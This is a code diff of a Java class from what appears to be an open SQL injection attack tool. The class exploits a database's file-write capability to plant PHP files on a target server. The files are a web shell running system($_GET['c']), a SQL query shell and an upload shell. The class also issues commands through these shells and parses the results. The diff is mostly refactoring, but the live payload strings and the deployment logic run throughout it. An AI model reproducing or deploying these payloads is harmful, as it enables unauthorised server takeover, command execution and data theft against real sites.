@@ -1,5 +1,5 @@
 /*******************************************************************************
- * Copyhacked (H) 2012-2014.
+ * Copyhacked (H) 2012-2016.
  * This program and the accompanying materials
  * are made available under no term at all, use it like
  * you want, but share and discuss about it
@@ -17,10 +17,13 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.io.UnsupportedEncodingException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Comparator;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -34,12 +37,16 @@ import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import org.apache.commons.lang3.StringUtils;
 import org.apache.log4j.Logger;
 
 import com.jsql.model.InjectionModel;
 import com.jsql.model.MediatorModel;
 import com.jsql.model.bean.util.Request;
+import com.jsql.model.bean.util.TypeHeader;
+import com.jsql.model.bean.util.TypeRequest;
 import com.jsql.model.exception.InjectionFailureException;
+import com.jsql.model.exception.JSqlException;
 import com.jsql.model.exception.StoppedByUserException;
 import com.jsql.model.injection.method.MethodInjection;
 import com.jsql.model.suspendable.SuspendableGetRows;
@@ -61,40 +68,44 @@ public class RessourceAccess {
     /**
      * File name for web shell.
      */
-    public static final String FILENAME_WEBSHELL
-            = "j" + InjectionModel.VERSION_JSQL + ".tmp1.php";
-    
-    /**
-     * File name for upload form.
-     */
-    public static final String FILENAME_UPLOAD
-            = "j" + InjectionModel.VERSION_JSQL + ".tmp2.php";
+    public static final String FILENAME_WEBSHELL = 
+        "."+ InjectionModel.VERSION_JSQL + ".jw.php";
     
     /**
      * File name for sql shell.
      */
-    public static final String FILENAME_SQLSHELL
-            = "j" + InjectionModel.VERSION_JSQL + ".tmp3.php";
+    public static final String FILENAME_SQLSHELL = 
+        "."+ InjectionModel.VERSION_JSQL + ".js.php";
+    
+    /**
+     * File name for upload form.
+     */
+    public static final String FILENAME_UPLOAD = 
+        "."+ InjectionModel.VERSION_JSQL + ".ju.php";
     
     /**
      * True if admin page sould stop, false otherwise.
      */
-    public static boolean isSearchAdminStopped = false;
+    private static boolean isSearchAdminStopped = false;
     
     /**
      * True if scan list sould stop, false otherwise.
      */
-    public static boolean isScanStopped = false;
-    
+    private static boolean isScanStopped = false;
+
     /**
      * True if file search must stop, false otherwise.
      */
-    public static boolean isSearchFileStopped = false;
-    
+    private static boolean isSearchFileStopped = false;
+
     /**
      * True if current user has right to read file. 
      */
-    public static boolean readingIsAllowed = false;
+    private static boolean readingIsAllowed = false;
+
+    private RessourceAccess() {
+        
+    }
 
     /**
      * Check if every page in the list responds 200 OK.
@@ -138,7 +149,7 @@ public class RessourceAccess {
                 CallableAdminPage currentCallable = taskCompletionService.take().get();
                 if (currentCallable.isHttpResponseOk()) {
                     Request request = new Request();
-                    request.setMessage("CreateAdminPageTab");
+                    request.setMessage(TypeRequest.CREATE_ADMIN_PAGE_TAB);
                     request.setParameters(currentCallable.getUrl());
                     MediatorModel.model().sendToViews(request);
 
@@ -161,7 +172,7 @@ public class RessourceAccess {
         }
 
         Request request = new Request();
-        request.setMessage("EndAdminSearch");
+        request.setMessage(TypeRequest.END_ADMIN_SEARCH);
         MediatorModel.model().sendToViews(request);
     }
     
@@ -172,48 +183,98 @@ public class RessourceAccess {
      * @throws InjectionFailureException
      * @throws StoppedByUserException
      */
-    public static void createWebShell(String pathShell, String urlShell) throws InjectionFailureException, StoppedByUserException {
+    public static void createWebShell(String pathShell, String urlShell) throws JSqlException {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
+        
+        String payloadWeb = "<SQLi><?php system($_GET['c']); ?><iLQS>";
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
             pathShellFixed += "/";
         }
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi><?php system($_GET['c']); ?><iLQS>", pathShellFixed + FILENAME_WEBSHELL)
+            MediatorModel.model().vendor.instance().sqlTextIntoFile(payloadWeb, pathShellFixed + FILENAME_WEBSHELL)
         );
 
+        String resultInjection;
         String[] sourcePage = {""};
-        String resultInjection = new SuspendableGetRows().run(
-            MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_WEBSHELL),
-            sourcePage,
-            false,
-            1,
-            null
-        );
+        try {
+            resultInjection = new SuspendableGetRows().run(
+                MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_WEBSHELL),
+                sourcePage,
+                false,
+                1,
+                null
+            );
 
-        if ("".equals(resultInjection)) {
-            MediatorModel.model().sendResponseFromSite("Can't find web shell at "+ pathShellFixed + FILENAME_WEBSHELL, sourcePage[0].trim());
-            return;
+            if ("".equals(resultInjection)) {
+                throw new JSqlException("Payload integrity verification: Empty payload");
+            }
+        } catch(JSqlException e) {
+            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
-
+        
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
+            url = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
         }
 
-        if (resultInjection.indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
-            LOGGER.info("Web shell payload sent at "+ pathShellFixed + FILENAME_WEBSHELL);
+        if (resultInjection.indexOf(payloadWeb) > -1) {
+            LOGGER.info("Web payload deployed at \""+ url + FILENAME_WEBSHELL +"\" in \""+ pathShellFixed + FILENAME_WEBSHELL +"\"");
             
             Request request = new Request();
-            request.setMessage("CreateShellTab");
+            request.setMessage(TypeRequest.CREATE_SHELL_TAB);
             request.setParameters(pathShellFixed, url);
             MediatorModel.model().sendToViews(request);
         } else {
-            LOGGER.warn("Web shell creation failed");
+            throw new JSqlException("Incorrect Web payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
+    }
+    
+    private static String runCommandShell(String urlCommand) throws IOException {
+        URLConnection connection;
+
+        String url = urlCommand;
+        connection = new URL(url).openConnection();
+        connection.setReadTimeout(ConnectionUtil.TIMEOUT);
+        connection.setConnectTimeout(ConnectionUtil.TIMEOUT);
+
+        String pageSource = "";
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                pageSource += line + "\n";
+            }
+        }
+
+        Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
+        regexSearch.find();
+
+        String result;
+        // IllegalStateException #1544: catch incorrect execution
+        try {
+            result = regexSearch.group(1);
+        } catch (IllegalStateException e) {
+            // Fix return null from regex
+            result = "";
+            LOGGER.warn("Incorrect response from Web shell", e);
+        }
+        
+        Map<TypeHeader, Object> msgHeader = new HashMap<>();
+        msgHeader.put(TypeHeader.URL, url);
+        msgHeader.put(TypeHeader.POST, "");
+        msgHeader.put(TypeHeader.HEADER, "");
+        msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHTTPHeaders(connection));
+        msgHeader.put(TypeHeader.SOURCE, pageSource);
+        
+        Request request = new Request();
+        request.setMessage(TypeRequest.MESSAGE_HEADER);
+        request.setParameters(msgHeader);
+        MediatorModel.model().sendToViews(request);
+        
+        return result;
     }
     
     /**
@@ -223,50 +284,25 @@ public class RessourceAccess {
      * @param urlShell Web path of the shell
      */
     public static void runWebShell(String command, UUID uuidShell, String urlShell) {
-        URLConnection connection;
         String result = "";
+        
         try {
-            String url = urlShell + FILENAME_WEBSHELL + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1");
-            connection = new URL(url).openConnection();
-            connection.setReadTimeout(ConnectionUtil.timeOut);
-            connection.setConnectTimeout(ConnectionUtil.timeOut);
-
-            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-            String line, pageSource = "";
-            while ((line = reader.readLine()) != null) {
-                pageSource += line + "\n";
-            }
-            reader.close();
-
-            Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
-            regexSearch.find();
-
-            // IllegalStateException #1544: catch incorrect execution
-            try {
-                result = regexSearch.group(1);
-            } catch (IllegalStateException e) {
-                result = "";
-                LOGGER.warn("Incorrect response from Web shell");
-            }
+            result = runCommandShell(
+                urlShell + FILENAME_WEBSHELL + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1")
+            );
             
-            Map<String, Object> msgHeader = new HashMap<>();
-            msgHeader.put("Url", url);
-            msgHeader.put("Post", "");
-            msgHeader.put("Header", "");
-            msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
-            msgHeader.put("Source", pageSource);
-            
-            Request request = new Request();
-            request.setMessage("MessageHeader");
-            request.setParameters(msgHeader);
-            MediatorModel.model().sendToViews(request);
+            if ("".equals(result)) {
+                result = "No result.\nTry \"" + command.trim() + " 2>&1\" to get a system error message.\n";
+            }
+        } catch (UnsupportedEncodingException e) {
+            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e, e);
         } catch (IOException e) {
-            LOGGER.error(e, e);
+            LOGGER.warn("Shell execution error: "+ e, e);
         } finally {
             // Unfroze interface
             Request request = new Request();
-            request.setMessage("GetShellResult");
-            request.setParameters(uuidShell, result, command);
+            request.setMessage(TypeRequest.GET_WEB_SHELL_RESULT);
+            request.setParameters(uuidShell, result);
             MediatorModel.model().sendToViews(request);
         }
     }
@@ -280,12 +316,12 @@ public class RessourceAccess {
      * @throws InjectionFailureException
      * @throws StoppedByUserException
      */
-    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws InjectionFailureException, StoppedByUserException {
+    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
         
-        String s = 
+        String payloadSQL = 
             "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
                 + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');"
                 + "if(is_resource($result)){"
@@ -301,37 +337,41 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().vendor.getValue().getSqlTextIntoFile(s, pathShellFixed + FILENAME_SQLSHELL)
+            MediatorModel.model().vendor.instance().sqlTextIntoFile(payloadSQL, pathShellFixed + FILENAME_SQLSHELL)
         );
 
+        String resultInjection = "";
         String[] sourcePage = {""};
-        String resultInjection = new SuspendableGetRows().run(
-            MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_SQLSHELL),
-            sourcePage,
-            false,
-            1,
-            null
-        );
-
-        if ("".equals(resultInjection)) {
-            MediatorModel.model().sendResponseFromSite("Can't find SQL shell at " + pathShellFixed + FILENAME_SQLSHELL, sourcePage[0].trim());
-            return;
+        try {
+            resultInjection = new SuspendableGetRows().run(
+                MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_SQLSHELL),
+                sourcePage,
+                false,
+                1,
+                null
+            );
+            
+            if ("".equals(resultInjection)) {
+                throw new JSqlException("Bad payload integrity: Empty payload");
+            }
+        } catch(JSqlException e) {
+            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
+            url = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
         }
 
-        if (resultInjection.indexOf(s) > -1) {
-            LOGGER.info("SQL shell payload sent at "+ pathShellFixed + FILENAME_SQLSHELL);
+        if (resultInjection.indexOf(payloadSQL) > -1) {
+            LOGGER.info("SQL payload deployed at \""+ url + FILENAME_SQLSHELL +"\" in \""+ pathShellFixed + FILENAME_SQLSHELL +"\"");
             
             Request request = new Request();
-            request.setMessage("CreateSQLShellTab");
+            request.setMessage(TypeRequest.CREATE_SQL_SHELL_TAB);
             request.setParameters(pathShellFixed, url, username, password);
             MediatorModel.model().sendToViews(request);
         } else {
-            LOGGER.warn("SQL shell creation failed");
+            throw new JSqlException("Incorrect SQL payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
     }
 
@@ -344,49 +384,86 @@ public class RessourceAccess {
      * @param password USEr password [optional]
      */
     public static void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
-        URLConnection connection;
         String result = "";
         try {
-            String url = urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password;
-            connection = new URL(url).openConnection();
-            connection.setReadTimeout(ConnectionUtil.timeOut);
-            connection.setConnectTimeout(ConnectionUtil.timeOut);
+            result = runCommandShell(
+                urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password
+            );
+            
+            if (result.indexOf("<SQLr>") > -1) {
+                List<List<String>> listRows = new ArrayList<>();
+                Matcher rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
+                while (rowsMatcher.find()) {
+                    String values = rowsMatcher.group(1);
 
-            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-            String line, pageSource = "";
-            while ((line = reader.readLine()) != null) {
-                pageSource += line + "\n";
-            }
-            reader.close();
+                    Matcher fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
+                    List<String> listFields = new ArrayList<>();
+                    listRows.add(listFields);
+                    while (fieldsMatcher.find()) {
+                        String field = fieldsMatcher.group(1);
+                        listFields.add(field);
+                    }
+                }
 
-            Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
-            regexSearch.find();
-            
-            // IllegalStateException #1544: catch incorrect execution
-            try {
-                result = regexSearch.group(1);
-            } catch (IllegalStateException e) {
-                result = "";
-                LOGGER.warn("Incorrect response from SQL shell");
+                if (!listRows.isEmpty()) {
+                    List<Integer> listFieldsLength = new ArrayList<>();
+                    for (
+                        final int[] indexLongestRowSearch = {0}; 
+                        indexLongestRowSearch[0] < listRows.get(0).size(); 
+                        indexLongestRowSearch[0]++
+                    ) {
+                        Collections.sort(
+                            listRows, 
+                            new Comparator<List<String>>() {
+                                @Override
+                                public int compare(List<String> firstRow, List<String> secondRow) {
+                                    return secondRow.get(indexLongestRowSearch[0]).length() - firstRow.get(indexLongestRowSearch[0]).length();
+                                }
+                            }
+                        );
+
+                        listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch[0]).length());
+                    }
+
+                    if (!"".equals(result)) {
+                        String tableText = "+";
+                        for (Integer fieldLength: listFieldsLength) {
+                            tableText += "-"+ StringUtils.repeat("-", fieldLength) +"-+";
+                        }
+                        tableText += "\n";
+
+                        for (List<String> listFields: listRows) {
+                            tableText += "|";
+                            int cursorPosition = 0;
+                            for (String field: listFields) {
+                                tableText += " "+ field + StringUtils.repeat(" ", listFieldsLength.get(cursorPosition) - field.length()) +" |";
+                                cursorPosition++;
+                            }
+                            tableText += "\n";
+                        }
+
+                        tableText += "+";
+                        for (Integer fieldLength: listFieldsLength) {
+                            tableText += "-"+ StringUtils.repeat("-", fieldLength) +"-+";
+                        }
+                        tableText += "\n";
+                        
+                        result = tableText;
+                    }
+                }
+            } else if (result.indexOf("<SQLm>") > -1) {
+                result = result.replace("<SQLm>", "") + "\n";
+            } else if (result.indexOf("<SQLe>") > -1) {
+                result = result.replace("<SQLe>", "") + "\n";
             }
-            
-            Map<String, Object> msgHeader = new HashMap<>();
-            msgHeader.put("Url", url);
-            msgHeader.put("Post", "");
-            msgHeader.put("Header", "");
-            msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
-            msgHeader.put("Source", pageSource);
-            
-            Request request = new Request();
-            request.setMessage("MessageHeader");
-            request.setParameters(msgHeader);
-            MediatorModel.model().sendToViews(request);
+        } catch (UnsupportedEncodingException e) {
+            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e, e);
         } catch (IOException e) {
-            LOGGER.error(e, e);
+            LOGGER.warn("Shell execution error: "+ e, e);
         } finally {
             // Unfroze interface
             Request request = new Request();
-            request.setMessage("GetSQLShellResult");
+            request.setMessage(TypeRequest.GET_SQL_SHELL_RESULT);
             request.setParameters(uuidShell, result, command);
             MediatorModel.model().sendToViews(request);
         }
@@ -401,49 +478,52 @@ public class RessourceAccess {
      * @throws StoppedByUserException
      * @throws IOException 
      */
-    public static void uploadFile(String pathFile, String urlFile, File file) throws InjectionFailureException, StoppedByUserException, IOException {
+    public static void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
         
         String phpShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
-        String pathPhpShellFixed = pathFile;
-        if (!pathPhpShellFixed.matches(".*/$")) {
-            pathPhpShellFixed += "/";
+        String pathShellFixed = pathFile;
+        if (!pathShellFixed.matches(".*/$")) {
+            pathShellFixed += "/";
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShellToInject +"<iLQS>", pathPhpShellFixed + FILENAME_UPLOAD)
+            MediatorModel.model().vendor.instance().sqlTextIntoFile("<SQLi>"+ phpShellToInject +"<iLQS>", pathShellFixed + FILENAME_UPLOAD)
         );
 
-        String[] sourcePagePhpShell = {""};
-        String phpShellInjected = new SuspendableGetRows().run(
-            MediatorModel.model().vendor.getValue().getSqlReadFile(pathPhpShellFixed + FILENAME_UPLOAD),
-            sourcePagePhpShell,
-            false,
-            1,
-            null
-        );
-
-        if ("".equals(phpShellInjected)) {
-            MediatorModel.model().sendResponseFromSite("Can't find upload file at "+ pathPhpShellFixed + FILENAME_UPLOAD, sourcePagePhpShell[0].trim());
-            return;
-        } else {
-            LOGGER.info("Upload payload sent at "+ pathPhpShellFixed + FILENAME_UPLOAD);
+        String[] sourcePage = {""};
+        String phpShellInjected;
+        try {
+            phpShellInjected = new SuspendableGetRows().run(
+                MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
+                sourcePage,
+                false,
+                1,
+                null
+            );
+            
+            if ("".equals(phpShellInjected)) {
+                throw new JSqlException("Bad payload integrity: Empty payload");
+            }
+        } catch(JSqlException e) {
+            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
 
         String urlFileFixed = urlFile;
         if ("".equals(urlFileFixed)) {
-            urlFileFixed = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
+            urlFileFixed = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
         }
-
+        
         if (phpShellInjected.indexOf(phpShellToInject) > -1) {
+            LOGGER.info("Upload payload deployed at \""+ urlFileFixed + FILENAME_UPLOAD +"\" in \""+ pathShellFixed + FILENAME_UPLOAD +"\"");
+            
             String crLf = "\r\n";
             
-            URLConnection connection = null;
             URL urlUploadShell = new URL(urlFileFixed +"/"+ FILENAME_UPLOAD);
-            connection = urlUploadShell.openConnection();
+            URLConnection connection = urlUploadShell.openConnection();
             connection.setDoOutput(true);
             
             try (
@@ -500,30 +580,30 @@ public class RessourceAccess {
                     } while (len > 0);
     
                     if (result.indexOf("SQLiy") > -1) {
-                        LOGGER.debug("Upload successful.");
+                        LOGGER.debug("Upload successful");
                     } else {
-                        LOGGER.warn("Upload failed.");
+                        LOGGER.warn("Upload failed");
                     }
                     
-                    Map<String, Object> msgHeader = new HashMap<>();
-                    msgHeader.put("Url", urlFileFixed);
-                    msgHeader.put("Post", "");
-                    msgHeader.put("Header", "");
-                    msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
-                    msgHeader.put("Source", result);
+                    Map<TypeHeader, Object> msgHeader = new HashMap<>();
+                    msgHeader.put(TypeHeader.URL, urlFileFixed);
+                    msgHeader.put(TypeHeader.POST, "");
+                    msgHeader.put(TypeHeader.HEADER, "");
+                    msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHTTPHeaders(connection));
+                    msgHeader.put(TypeHeader.SOURCE, result);
     
                     Request request = new Request();
-                    request.setMessage("MessageHeader");
+                    request.setMessage(TypeRequest.MESSAGE_HEADER);
                     request.setParameters(msgHeader);
                     MediatorModel.model().sendToViews(request);
                 } 
             }
         } else {
-            LOGGER.warn("Upload not usable.");
+            throw new JSqlException("Incorrect Upload payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
         
         Request request = new Request();
-        request.setMessage("EndUpload");
+        request.setMessage(TypeRequest.END_UPLOAD);
         MediatorModel.model().sendToViews(request);
     }
     
@@ -533,11 +613,11 @@ public class RessourceAccess {
      * @throws InjectionFailureException
      * @throws StoppedByUserException
      */
-    public static boolean isReadingAllowed() throws InjectionFailureException, StoppedByUserException {
+    public static boolean isReadingAllowed() throws JSqlException {
         String[] sourcePage = {""};
 
         String resultInjection = new SuspendableGetRows().run(
-            MediatorModel.model().vendor.getValue().getSqlPrivilegeCheck(),
+            MediatorModel.model().vendor.instance().sqlPrivilegeTest(),
             sourcePage,
             false,
             1,
@@ -547,18 +627,18 @@ public class RessourceAccess {
         if ("".equals(resultInjection)) {
             MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
             Request request = new Request();
-            request.setMessage("MarkFileSystemInvulnerable");
+            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_INVULNERABLE);
             MediatorModel.model().sendToViews(request);
             readingIsAllowed = false;
         } else if ("false".equals(resultInjection)) {
             LOGGER.warn("No FILE privilege");
             Request request = new Request();
-            request.setMessage("MarkFileSystemInvulnerable");
+            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_INVULNERABLE);
             MediatorModel.model().sendToViews(request);
             readingIsAllowed = false;
         } else {
             Request request = new Request();
-            request.setMessage("MarkFileSystemVulnerable");
+            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_VULNERABLE);
             MediatorModel.model().sendToViews(request);
             readingIsAllowed = true;
         }
@@ -574,8 +654,7 @@ public class RessourceAccess {
      * @throws InterruptedException 
      * @throws ExecutionException 
      */
-    public static void readFile(List<ListItem> pathsFiles)
-        throws InjectionFailureException, StoppedByUserException, InterruptedException 
+    public static void readFile(List<ListItem> pathsFiles) throws JSqlException, InterruptedException, ExecutionException 
     {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
@@ -594,31 +673,27 @@ public class RessourceAccess {
         
         try {
             for (int tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
-                try {
-                    CallableFile currentCallable = taskCompletionService.take().get();
-                    if (!"".equals(currentCallable.getFileSource())) {
-                        String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
-                        String content = currentCallable.getFileSource();
-                        String path = currentCallable.getUrl();
-        
-                        Request request = new Request();
-                        request.setMessage("CreateFileTab");
-                        request.setParameters(name, content, path);
-                        MediatorModel.model().sendToViews(request);
-        
-                        if (!duplicate.contains(path.replace(name, ""))) {
-                            LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
-                        }
-                        duplicate.add(path.replace(name, ""));
-        
-                        countFileFound++;
+                CallableFile currentCallable = taskCompletionService.take().get();
+                if (!"".equals(currentCallable.getFileSource())) {
+                    String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
+                    String content = currentCallable.getFileSource();
+                    String path = currentCallable.getUrl();
+    
+                    Request request = new Request();
+                    request.setMessage(TypeRequest.CREATE_FILE_TAB);
+                    request.setParameters(name, content, path);
+                    MediatorModel.model().sendToViews(request);
+    
+                    if (!duplicate.contains(path.replace(name, ""))) {
+                        LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
                     }
-                    
-                    if (RessourceAccess.isSearchFileStopped) {
-                        throw new StoppedByUserException();
-                    }
-                } catch (ExecutionException e) {
-                    // File not found, probably
+                    duplicate.add(path.replace(name, ""));
+    
+                    countFileFound++;
+                }
+                
+                if (RessourceAccess.isSearchFileStopped) {
+                    throw new StoppedByUserException();
                 }
             }
         } finally {
@@ -633,7 +708,7 @@ public class RessourceAccess {
                 LOGGER.trace("File(s) found: " + countFileFound + "/" + submittedTasks);
             }
             Request request = new Request();
-            request.setMessage("EndFileSearch");
+            request.setMessage(TypeRequest.END_FILE_SEARCH);
             MediatorModel.model().sendToViews(request);
         }
     }
@@ -641,7 +716,7 @@ public class RessourceAccess {
     public static void scanList(List<ListItem> urlList) {
         // Erase everything in the view from a previous injection
         Request requests = new Request();
-        requests.setMessage("ResetInterface");
+        requests.setMessage(TypeRequest.RESET_INTERFACE);
         MediatorModel.model().sendToViews(requests);
         
         // wait for ending of ongoing interaction between two injections
@@ -679,7 +754,31 @@ public class RessourceAccess {
         RessourceAccess.isScanStopped = false;
 
         Request request = new Request();
-        request.setMessage("EndScanList");
+        request.setMessage(TypeRequest.END_SCAN_LIST);
         MediatorModel.model().sendToViews(request);
+    }
+    
+    public static boolean isSearchAdminStopped() {
+        return isSearchAdminStopped;
+    }
+
+    public static void setSearchAdminStopped(boolean isSearchAdminStopped) {
+        RessourceAccess.isSearchAdminStopped = isSearchAdminStopped;
+    }
+    
+    public static void setScanStopped(boolean isScanStopped) {
+        RessourceAccess.isScanStopped = isScanStopped;
+    }
+
+    public static void setSearchFileStopped(boolean isSearchFileStopped) {
+        RessourceAccess.isSearchFileStopped = isSearchFileStopped;
+    }
+
+    public static boolean isReadingIsAllowed() {
+        return readingIsAllowed;
+    }
+
+    public static void setReadingIsAllowed(boolean readingIsAllowed) {
+        RessourceAccess.readingIsAllowed = readingIsAllowed;
     }
 }
